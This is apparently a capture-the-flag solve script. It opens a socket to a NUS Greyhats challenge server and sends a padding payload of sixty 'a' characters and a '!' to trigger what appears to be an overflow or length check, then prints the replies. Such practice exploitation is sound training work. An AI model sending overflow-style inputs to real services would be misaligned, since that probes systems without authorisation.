import socket
import time

s = socket.socket()
s.connect(('challs.nusgreyhats.org', 36267))

print(s.recv(1024).decode())
payload = "a" * 60 + "!"
print("Sending payload:", payload)
s.send(payload.encode() + b'\n')

while True:
    data = s.recv(1024)
    if not data:
        break
    print(data.decode())
